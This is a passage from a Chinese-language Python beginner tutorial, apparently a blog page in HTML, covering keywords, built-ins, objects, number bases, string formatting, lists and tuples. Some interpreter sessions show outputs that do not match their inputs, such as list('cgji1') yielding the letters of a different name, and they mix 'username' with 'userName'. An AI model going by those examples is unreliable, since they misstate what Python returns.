<span class="string">&#x27;nonlocal&#x27;</span>, <span class="string">&#x27;not&#x27;</span>, <span class="string">&#x27;or&#x27;</span>, <span class="string">&#x27;pass&#x27;</span>, <span class="string">&#x27;raise&#x27;</span>, <span class="string">&#x27;return&#x27;</span>, <span class="string">&#x27;try&#x27;</span>, <span class="string">&#x27;while&#x27;</span>, <span class="string">&#x27;with&#x27;</span>, <span class="string">&#x27;yield&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="2-4-2-builtins"><a href="#2-4-2-builtins" class="headerlink" title="2.4.2 builtins"></a>2.4.2 builtins</h3><p>除了关键字之外，Python 还有可以在任何一级代码使用的“内建”的名字集合，这些名字可以由解释器设置或使用，内置函数就是在任何时候，任何地方都可以调用的函数。虽然built-in 不是关键字，但是应该把它当作“系统保留字”。</p><p>内置方法（函数），在任何地方都可以调用如下：</p><table><thead><tr><th></th><th></th><th>内置函数</th><th></th><th></th></tr></thead><tbody><tr><td>abs()</td><td>delattr()</td><td>hash()</td><td>memoryview()</td><td>set()</td></tr><tr><td>all()</td><td>dict()</td><td>help()</td><td>min()</td><td>setattr()</td></tr><tr><td>any()</td><td>dir()</td><td>hex()</td><td>next()</td><td>slice()</td></tr><tr><td>ascii()</td><td>divmod()</td><td>id()</td><td>object()</td><td>sorted()</td></tr><tr><td>bin()</td><td>enumerate()</td><td>input()</td><td>oct()</td><td>staticmethod()</td></tr><tr><td>bool()</td><td>eval()</td><td>int()</td><td>open()</td><td>str()</td></tr><tr><td>breakpoint()</td><td>exec()</td><td>isinstance()</td><td>ord()</td><td>sum()</td></tr><tr><td>bytearray()</td><td>filter()</td><td>issubclass()</td><td>pow()</td><td>super()</td></tr><tr><td>bytes()</td><td>float()</td><td>iter()</td><td>print()</td><td>tuple()</td></tr><tr><td>callable()</td><td>format()</td><td>len()</td><td>property()</td><td>type()</td></tr><tr><td>chr()</td><td>frozenset()</td><td>list()</td><td>range()</td><td>vars()</td></tr><tr><td>classmethod()</td><td>getattr()</td><td>locals()</td><td>repr()</td><td>zip()</td></tr><tr><td>compile()</td><td>globals()</td><td>map()</td><td>reversed()</td><td><strong>import</strong>()</td></tr><tr><td>complex()</td><td>hasattr()</td><td>max()</td><td>round()</td><td></td></tr></tbody></table><p>保留的常量：</p><ul><li>True</li><li>False</li><li>None</li></ul><h3 id="2-4-3-基本风格"><a href="#2-4-3-基本风格" class="headerlink" title="2.4.3 基本风格"></a>2.4.3 基本风格</h3><p>编写程序时，应该建立一种统一且容易阅读的结构，并将它应用到每一个文件中去。在Python 语言中：</p><p><code>&#123;&#125;</code> 并不代表代码块</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python3</span></span><br><span class="line"><span class="comment"># -*- coding:gbk -*-                    #起始行</span></span><br><span class="line"><span class="string">&#x27;this is a test module&#x27;</span>              <span class="comment">#模块文档字符串</span></span><br><span class="line"><span class="keyword">import</span> sys                       <span class="comment">#导入模块</span></span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">debug = <span class="literal">True</span>                    <span class="comment">#全局变量声明</span></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">FooClass</span>(<span class="title class_ inherited__">object</span>):             <span class="comment">#类定义</span></span><br><span class="line">    <span class="string">&#x27;Foo class&#x27;</span></span><br><span class="line">    <span class="keyword">pass</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">test</span>():                           <span class="comment">#函数定义</span></span><br><span class="line">    <span class="string">&quot;test function&quot;</span></span><br><span class="line">    foo = FooClass()</span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:             <span class="comment">#程序主体</span></span><br><span class="line">    test()</span><br></pre></td></tr></table></figure><h1 id="3-Python-变量类型"><a href="#3-Python-变量类型" class="headerlink" title="3.Python 变量类型"></a>3.Python 变量类型</h1><h2 id="3-1-对象"><a href="#3-1-对象" class="headerlink" title="3.1 对象"></a>3.1 对象</h2><h3 id="3-1-1-Python-对象特征"><a href="#3-1-1-Python-对象特征" class="headerlink" title="3.1.1 Python 对象特征"></a>3.1.1 Python 对象特征</h3><p>所有的Python 对象都拥有三个特性：</p><table><thead><tr><th>特性</th><th>说明</th><th>例子</th></tr></thead><tbody><tr><td>身份</td><td>每一个对象都有一个唯一的身份，标识自己， 任何对象的身份可以使用内建函数id() 来得到</td><td>id(username)</td></tr><tr><td>类型</td><td>决定了该对象可以保存什么类型的值， 可以进行什么样的操作，以及遵循什么样的规则。 用内建函数type() 查看对象的类型</td><td>type(username)</td></tr><tr><td>值</td><td>对象表示的数据项</td><td>print(username)</td></tr></tbody></table><h3 id="3-1-2-Python-对象属性"><a href="#3-1-2-Python-对象属性" class="headerlink" title="3.1.2 Python 对象属性"></a>3.1.2 Python 对象属性</h3><p>某些Python 对象有属性、值或相关联的可执行代码，用点<code>.</code> 标记法来访问属性。最常用的属性是函数和方法，不过有一些Python 类型也有数据属性。含有数据属性的对象包括（但不限于）：类、类实例、模块、复数和文件。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>username.</span><br><span class="line">userName.capitalize(   userName.isdigit(      userName.rfind(</span><br><span class="line">userName.casefold(     userName.isidentifier( userName.rindex(</span><br><span class="line">userName.center(       userName.islower(      userName.rjust(</span><br><span class="line">userName.count(        userName.isnumeric(    userName.rpartition(</span><br><span class="line">userName.encode(       userName.isprintable(  userName.rsplit(</span><br><span class="line">userName.endswith(     userName.isspace(      userName.rstrip(</span><br><span class="line">userName.expandtabs(   userName.istitle(      userName.split(</span><br><span class="line">userName.find(         userName.isupper(      userName.splitlines(</span><br><span class="line">userName.<span class="built_in">format</span>(       userName.join(         userName.startswith(</span><br><span class="line">userName.format_map(   userName.ljust(        userName.strip(</span><br><span class="line">userName.index(        userName.lower(        userName.swapcase(</span><br><span class="line">userName.isalnum(      userName.lstrip(       userName.title(</span><br><span class="line">userName.isalpha(      userName.maketrans(    userName.translate(</span><br><span class="line">userName.isascii(      userName.partition(    userName.upper(</span><br><span class="line">userName.isdecimal(    userName.replace(      userName.zfill(</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>username.lower()</span><br><span class="line"><span class="string">&#x27;cgji1&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>userName</span><br><span class="line"><span class="string">&#x27;cgji1&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-1-3-对象身份比较"><a href="#3-1-3-对象身份比较" class="headerlink" title="3.1.3 对象身份比较"></a>3.1.3 对象身份比较</h3><p>对象可以通过引用被赋值到另一个变量，因为每个变量都指向同一个（共享的）数据对象，只要任何一个引用发生改变，该对象的其它引用也会随之改变。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>x = <span class="number">1</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>y = x</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(x)</span><br><span class="line"><span class="number">4318726800</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">id</span>(y)</span><br><span class="line"><span class="number">4318726800</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h2 id="3-2-数字"><a href="#3-2-数字" class="headerlink" title="3.2 数字"></a>3.2 数字</h2><h3 id="3-2-1-基本数字类型"><a href="#3-2-1-基本数字类型" class="headerlink" title="3.2.1 基本数字类型"></a>3.2.1 基本数字类型</h3><table><thead><tr><th>关键字</th><th>解释</th><th>例子</th></tr></thead><tbody><tr><td>int</td><td>有符号整数</td><td>自然数</td></tr><tr><td>bool boolean</td><td>布尔值</td><td>True：1 False：0</td></tr><tr><td>float</td><td>浮点数</td><td>π</td></tr></tbody></table><h3 id="3-2-2-进制间的数字表示方式"><a href="#3-2-2-进制间的数字表示方式" class="headerlink" title="3.2.2 进制间的数字表示方式"></a>3.2.2 进制间的数字表示方式</h3><p>Python 默认以十进制数显示，可以用其他方法表示数字：</p><table><thead><tr><th>进制</th><th>表达</th><th>实例</th></tr></thead><tbody><tr><td>10 进制</td><td>默认表达方式</td><td>11</td></tr><tr><td>2 进制</td><td>数字以0b 或0B 开头</td><td>0b11</td></tr><tr><td>8 进制</td><td>数字以0o 开头</td><td>0o11</td></tr><tr><td>16 进制</td><td>数字以0x 或0X 开头</td><td>0x11</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">11</span></span><br><span class="line"><span class="number">11</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0b11</span></span><br><span class="line"><span class="number">3</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0o11</span></span><br><span class="line"><span class="number">9</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">0x11</span></span><br><span class="line"><span class="number">17</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-2-3-位运算符"><a href="#3-2-3-位运算符" class="headerlink" title="3.2.3 位运算符"></a>3.2.3 位运算符</h3><table><thead><tr><th>位运算符</th><th>功能</th></tr></thead><tbody><tr><td>num1 &lt;&lt; num2</td><td>num1 左移num2 位</td></tr><tr><td>num1 &gt;&gt; num2</td><td>num1 右移num2 位</td></tr><tr><td>num1 &amp; num2</td><td>num1 与num2 按位与</td></tr><tr><td>num1 ^ num2</td><td>num1 异或 num2</td></tr><tr><td>num1 | num2</td><td>num1 与num2 按位或</td></tr><tr><td>~num</td><td>单目运算，对数的每一位取反</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span> &gt;&gt; <span class="number">2</span></span><br><span class="line"><span class="number">0</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span> &lt;&lt; <span class="number">2</span></span><br><span class="line"><span class="number">8</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-2-4-数字类型函数"><a href="#3-2-4-数字类型函数" class="headerlink" title="3.2.4 数字类型函数"></a>3.2.4 数字类型函数</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>int()</td><td>将字符串转化为数字</td></tr><tr><td>long()</td><td></td></tr><tr><td>float()</td><td></td></tr><tr><td>complex()</td><td></td></tr><tr><td>abs()</td><td>返回给定参数的绝对值</td></tr><tr><td>divmod()</td><td>内建函数把除法和取余运算结合起来，返回一个包含商和余数的元组</td></tr><tr><td>pow()</td><td>进行指数运算</td></tr><tr><td>round()</td><td>用于对浮点数进行四舍五入运算</td></tr></tbody></table><h3 id="3-2-5-仅用于整数的函数"><a href="#3-2-5-仅用于整数的函数" class="headerlink" title="3.2.5 仅用于整数的函数"></a>3.2.5 仅用于整数的函数</h3><table><thead><tr><th>函数</th><th>说明</th></tr></thead><tbody><tr><td>hex()</td><td>10 进制数转换为字符串形式的16 进制数</td></tr><tr><td>oct()</td><td>10 进制数转换为字符串形式的8 进制数</td></tr><tr><td>bin()</td><td>10 进制数转换为字符串形式的2 进制数</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">hex</span>(<span class="number">11</span>)</span><br><span class="line"><span class="string">&#x27;0xb&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">oct</span>(<span class="number">11</span>)</span><br><span class="line"><span class="string">&#x27;0o13&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">bin</span>(<span class="number">11</span>)</span><br><span class="line"><span class="string">&#x27;0b1011&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h2 id="3-3-字符串"><a href="#3-3-字符串" class="headerlink" title="3.3 字符串"></a>3.3 字符串</h2><h3 id="3-3-1-字符串的定义"><a href="#3-3-1-字符串的定义" class="headerlink" title="3.3.1 字符串的定义"></a>3.3.1 字符串的定义</h3><p>Python 中字符串被定义为引号之间的字符集合。Python 支持使用成对的单引号或双引号，无论单引号，还是双引号，表示的意义相同。Python 还支持三引号（三个连续的单引号或者双引号），可以用来包含特殊字符；Python 不区分字符和字符串。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 07 - 字符串的定义.py</span></span><br><span class="line"></span><br><span class="line">username = <span class="string">&#x27;cgji1&#x27;</span></span><br><span class="line">username = <span class="string">&quot;cgji1&quot;</span></span><br><span class="line">username = <span class="string">&#x27;&#x27;&#x27;cgji1&#x27;&#x27;&#x27;</span></span><br><span class="line">username = <span class="string">&quot;&quot;&quot;cgji1&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">type</span>(username))</span><br></pre></td></tr></table></figure><h3 id="3-3-2-字符串连接"><a href="#3-3-2-字符串连接" class="headerlink" title="3.3.2 字符串连接"></a>3.3.2 字符串连接</h3><p>字符串连接的时候可以使用<code>+</code> 或者<code>*</code>。</p><p>使用<code>+</code>号可以将多个字符串拼接在一起。或者使用<code>*</code> 号可以将一个字符串重复多次输出。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 08 - 字符串拼接.py</span></span><br><span class="line"></span><br><span class="line">username = <span class="string">&quot;cgji1&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;Welcome, &quot;</span> + username * <span class="number">5</span>)</span><br></pre></td></tr></table></figure><p>二狗子问题：</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="number">2</span> + <span class="string">&#x27;dog&#x27;</span></span><br><span class="line">Traceback (most recent call last):</span><br><span class="line">  File <span class="string">&quot;&lt;stdin&gt;&quot;</span>, line <span class="number">1</span>, <span class="keyword">in</span> &lt;module&gt;</span><br><span class="line">TypeError: unsupported operand <span class="built_in">type</span>(s) <span class="keyword">for</span> +: <span class="string">&#x27;int&#x27;</span> <span class="keyword">and</span> <span class="string">&#x27;str&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">str</span>(<span class="number">2</span>) + <span class="string">&#x27;dog&#x27;</span></span><br><span class="line"><span class="string">&#x27;2dog&#x27;</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-3-3-单个字符操作"><a href="#3-3-3-单个字符操作" class="headerlink" title="3.3.3 单个字符操作"></a>3.3.3 单个字符操作</h3><table><thead><tr><th>单个字符操作</th><th>例子</th></tr></thead><tbody><tr><td>将字符转化成ASCII 码</td><td>ord(‘a’)</td></tr><tr><td>将ASCII 码转化位字符</td><td>chr(97)</td></tr></tbody></table><h3 id="3-3-4-字符串操作"><a href="#3-3-4-字符串操作" class="headerlink" title="3.3.4 字符串操作"></a>3.3.4 字符串操作</h3><table><thead><tr><th>字符串操作</th><th>实例</th></tr></thead><tbody><tr><td>比较运算符： 字符串按照字符的ASCII 码值进行比较。</td><td>‘b’ &lt; ‘bool’ ‘b’ &gt; ‘abcd’</td></tr><tr><td>角标访问： 利用偏离量获取字符串中的字符。</td><td>‘cgji1’[1]</td></tr><tr><td>切片：取子串 str[n:m]，n，m 均代表偏移量，m &gt; n，[n,m) str[::n]，每n 个字母一组，取第一个字母 str[::-1]，字符串反向</td><td>‘cgji1’[1:3] ‘cgji1’[::3] ‘cgji1’[::-1]</td></tr><tr><td>成员关系： 字符串A 是否是字符串B 的子串</td><td>‘AJ’ in ‘cgji1’ ‘a’ not in ‘cgji1’</td></tr></tbody></table><h3 id="3-3-5-格式化操作符"><a href="#3-3-5-格式化操作符" class="headerlink" title="3.3.5 格式化操作符"></a>3.3.5 格式化操作符</h3><table><thead><tr><th>格式化字符</th><th>转换方式</th></tr></thead><tbody><tr><td>%s</td><td>字符串</td></tr><tr><td>%d</td><td>10 进制数</td></tr><tr><td>%e</td><td>科学计数法 “%e” %10000000000</td></tr><tr><td>%f</td><td>浮点数</td></tr><tr><td>辅助指令</td><td>作用</td></tr><tr><td>数值</td><td>定义宽度或小数点精度，例如：%5s，%.3f</td></tr><tr><td>-</td><td>左对齐</td></tr><tr><td>+</td><td>正负数前面显示符号 “%+d” %-10</td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 字符串格式化输出.py</span></span><br><span class="line"></span><br><span class="line">students = [</span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;cgji1&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">24</span>&#125;, </span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Lilei&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">25</span>&#125;, </span><br><span class="line">    &#123;<span class="string">&quot;name&quot;</span>:<span class="string">&quot;Hanmeimei&quot;</span>, <span class="string">&quot;age&quot;</span>:<span class="number">23</span>&#125;</span><br><span class="line">    ]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name: %10s, age: %10d&quot;</span> % (students[<span class="number">0</span>][<span class="string">&quot;name&quot;</span>], students[<span class="number">0</span>][<span class="string">&quot;age&quot;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name: %10s, age: %10d&quot;</span> % (students[<span class="number">1</span>][<span class="string">&quot;name&quot;</span>], students[<span class="number">1</span>][<span class="string">&quot;age&quot;</span>]))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;name: %-10s, age: %-10d&quot;</span> % (students[<span class="number">2</span>][<span class="string">&quot;name&quot;</span>], students[<span class="number">2</span>][<span class="string">&quot;age&quot;</span>]))</span><br></pre></td></tr></table></figure><h3 id="3-3-6-format-格式化"><a href="#3-3-6-format-格式化" class="headerlink" title="3.3.6 format 格式化"></a>3.3.6 format 格式化</h3><p>Python2.6 开始，新增了一种格式化字符串的函数<code>str.format()</code>，它增强了字符串格式化的功能。基本语法是通过<code>&#123;&#125;</code> 和 <code>:</code> 来代替以前的<code>%</code>。format 函数可以接受不限个参数，位置可以不按顺序。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">&gt;&gt;&gt;<span class="string">&quot;&#123;&#125; &#123;&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)    <span class="comment"># 不设置指定位置，按默认顺序</span></span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&#123;0&#125; &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)  <span class="comment"># 设置指定位置</span></span><br><span class="line"><span class="string">&#x27;hello world&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;&#123;1&#125; &#123;0&#125; &#123;1&#125;&quot;</span>.<span class="built_in">format</span>(<span class="string">&quot;hello&quot;</span>, <span class="string">&quot;world&quot;</span>)  <span class="comment"># 设置指定位置</span></span><br><span class="line"><span class="string">&#x27;world hello world&#x27;</span></span><br></pre></td></tr></table></figure><h3 id="3-3-7-字符串常用内建函数"><a href="#3-3-7-字符串常用内建函数" class="headerlink" title="3.3.7 字符串常用内建函数"></a>3.3.7 字符串常用内建函数</h3><table><thead><tr><th>常用内建函数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>s.strip()</td><td>删除字符串实例字符串两端的空白</td><td>‘ cgji1 ‘.strip()</td></tr><tr><td>s.replace(sub,rep)</td><td>搜索s 字符串中的sub， 并替换为rep</td><td>‘cgji1’.replace(‘e’,’E’)</td></tr><tr><td>s.split(c)</td><td>分割字符串，并返回一个列表， 可以指定分隔符c，默认为空白。</td><td>‘127.0.0.1’.split(‘.’)</td></tr><tr><td>s.center(width)</td><td>返回一个原字符串居中， 并使用空格填充至长度width 的新字符串</td><td>“cgji1”.center(11)</td></tr><tr><td>s.upper()</td><td>转换字符串实例中的小写字母为大写</td><td>‘cgji1’.upper()</td></tr><tr><td>s.lower()</td><td>转换字符串实例中的大写字母为小写</td><td>‘cgji1’.lower()</td></tr></tbody></table><h2 id="3-4-列表"><a href="#3-4-列表" class="headerlink" title="3.4 列表"></a>3.4 列表</h2><p>可以将列表当成普通的数组，它能保存任意数量任意类型的Python 对象。像字符串一样，列表也支持下标和切片操作；列表中的项目可以改变。</p><h3 id="3-4-1-列表的定义"><a href="#3-4-1-列表的定义" class="headerlink" title="3.4.1 列表的定义"></a>3.4.1 列表的定义</h3><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 09 - 列表的定义.py</span></span><br><span class="line"></span><br><span class="line">stu1 = [<span class="string">&quot;cgji1&quot;</span>, <span class="literal">True</span>, <span class="number">24</span>, <span class="number">59.9</span>]</span><br></pre></td></tr></table></figure><h3 id="3-4-2-列表元素访问"><a href="#3-4-2-列表元素访问" class="headerlink" title="3.4.2 列表元素访问"></a>3.4.2 列表元素访问</h3><p>通过下标（偏移量）访问数组元素。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment"># 10 - 列表元素的访问.py</span></span><br><span class="line"></span><br><span class="line">stu1 = [<span class="string">&quot;cgji1&quot;</span>, <span class="literal">True</span>, <span class="number">24</span>, <span class="number">59.9</span>]</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;stu1[<span class="number">0</span>]&#125;</span> 的成绩是<span class="subst">&#123;stu1[<span class="number">3</span>]&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">stu1[<span class="number">3</span>] += <span class="number">0.1</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;经过不断刻苦努力，<span class="subst">&#123;stu1[<span class="number">0</span>]&#125;</span> 的成绩提高了0.1 分，为<span class="subst">&#123;stu1[<span class="number">3</span>]&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure><h3 id="3-4-3-列表也是序列"><a href="#3-4-3-列表也是序列" class="headerlink" title="3.4.3 列表也是序列"></a>3.4.3 列表也是序列</h3><p>由于列表也是序列类型，所以<code>+</code> |<code>*</code> | <code>in</code> | <code>not in</code>，都适用于列表，但是需要注意参与运算的对象属于同一类型。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>nsClass = [<span class="string">&quot;cgji1&quot;</span>, <span class="string">&quot;LL&quot;</span>, <span class="string">&quot;HMM&quot;</span>, <span class="string">&quot;LH&quot;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>pyClass = [<span class="string">&#x27;MDM&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nsClass += pyClass</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>nsClass</span><br><span class="line">[<span class="string">&#x27;cgji1&#x27;</span>, <span class="string">&#x27;LL&#x27;</span>, <span class="string">&#x27;HMM&#x27;</span>, <span class="string">&#x27;LH&#x27;</span>, <span class="string">&#x27;MDM&#x27;</span>]</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="string">&quot;LH&quot;</span> <span class="keyword">in</span> nsClass</span><br><span class="line"><span class="literal">True</span></span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h3 id="3-4-4-作用于列表的函数"><a href="#3-4-4-作用于列表的函数" class="headerlink" title="3.4.4 作用于列表的函数"></a>3.4.4 作用于列表的函数</h3><p>直接向函数中传参，参数为列表。 </p><table><thead><tr><th>函数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>list()</td><td>将序列转化成列表</td><td>list(‘cgji1’)</td></tr><tr><td>len()</td><td>长度</td><td>len(stu)</td></tr><tr><td>max()</td><td>最大值</td><td>max(stu)</td></tr><tr><td>min()</td><td>最小值</td><td>min(stu)</td></tr><tr><td>sorted()</td><td>排序</td><td>sorted(stu)</td></tr><tr><td>enumerate()</td><td>取脚标和元素</td><td>list(enumerate(stu))</td></tr><tr><td></td><td></td><td></td></tr></tbody></table><h3 id="3-4-5-列表内建函数"><a href="#3-4-5-列表内建函数" class="headerlink" title="3.4.5 列表内建函数"></a>3.4.5 <strong>列表内建函数</strong></h3><table><thead><tr><th>函数</th><th>说明</th><th>示例</th></tr></thead><tbody><tr><td>l.append(new)</td><td>向列表中添加一个对象new</td><td></td></tr><tr><td>l.pop(obj)</td><td>删除列表中的元素</td><td></td></tr><tr><td>l.count(obj)</td><td>返回一个对象obj 在列表中出现的次数</td><td></td></tr><tr><td>l.index(obj)</td><td>obj 首次出现的位置</td><td></td></tr><tr><td>l.insert(index,obj)</td><td>在偏移量为index 的位置插入对象obj</td><td></td></tr><tr><td>l.reverse()</td><td>翻转列表</td><td></td></tr><tr><td>l.sort()</td><td>排序</td><td></td></tr><tr><td>l.extend(seq)</td><td>把序列seq 的内容添加到列表中</td><td></td></tr></tbody></table><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>name = <span class="string">&#x27;cgji1&#x27;</span></span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l = <span class="built_in">list</span>(name)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l.append(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l.count(<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l.index(<span class="string">&#x27;e&#x27;</span>)</span><br><span class="line"><span class="number">2</span></span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l.insert(<span class="number">0</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l.reverse()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l.sort()</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l.extend(name)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span>l</span><br><span class="line">[<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;j&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;t&#x27;</span>]</span><br><span class="line">&gt;&gt;&gt;</span><br></pre></td></tr></table></figure><h2 id="3-5-元组"><a href="#3-5-元组" class="headerlink" title="3.5 元组"></a>3.5 元组</h2><h3 id="3-5-1-元组定义"><a href="#3-5-1-元组定义" class="headerlink" title="3.5.1 元组定义"></a>3.5.1 元组定义</h3><p>可以认为元组是静态的列表，元组一旦定义，不能改变。</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="meta">&gt;&gt;&gt; </span>stu1 = (<span class="string">&quot;cgji1&quot;</span>, <span class="literal">True</span>, <span class="number">24</span>, <span class="number">59.9</span>)</span><br><span class="line"><span class="meta">&gt;&gt;&gt; </span><span class="built_in">type</span>(stu1)</span><br><span class="line">&lt;<span class="keyword">class</span> <span class="string">&#x27;tuple&#x27;</span>&gt;</span><br><span 